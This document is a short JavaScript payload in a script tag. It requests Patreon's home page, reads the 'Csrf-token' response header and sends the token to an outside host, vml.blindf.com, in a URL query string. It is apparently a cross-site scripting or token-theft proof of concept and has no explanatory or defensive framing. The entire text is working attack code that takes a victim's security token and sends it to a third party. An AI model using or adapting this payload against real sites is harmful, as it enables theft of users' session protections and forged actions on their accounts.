<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function()
{
if (xhr.readyState == 4 && xhr.status == 200)
{
var yourtoken = xhr.getResponseHeader('Csrf-token')
var xhr2 = new XMLHttpRequest();
xhr2.open("GET", "https://vml.blindf.com/b.php?c=querytoremember"+ yourtoken );
xhr2.send();
}
}
xhr.open("GET", "https://www.patreon.com/home");
xhr.send();
</script>
